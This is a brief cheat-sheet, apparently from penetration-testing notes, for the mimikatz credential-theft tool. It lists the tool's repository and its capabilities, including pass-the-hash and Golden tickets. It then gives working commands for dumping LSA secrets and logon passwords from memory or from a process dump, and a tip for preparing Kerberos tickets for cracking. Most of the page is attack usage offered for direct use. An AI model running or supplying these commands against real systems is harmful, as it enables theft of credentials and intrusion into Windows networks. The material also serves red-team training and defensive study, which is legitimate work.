# mimikatz

## Overview

 Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.


## Implementations

Original tool for windows:

    https://github.com/ParrotSec/mimikatz

Impacket collection of python tools implements mimikatz.py


## Usage

It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. 

    sekurlsa::minidump <process_dump>   loads process dump
    sekurlsa::logonpasswords    Searches for passwords


To do a lsa dump


    privilege::debug
    lsadump::lsa /inject

or

    privilege::debug
    sekurlsa::logonpasswords

## Tips

Convert base64 tickets to be cracked in linux hosts:

    echo "<base64 blob>" | tr -d \\n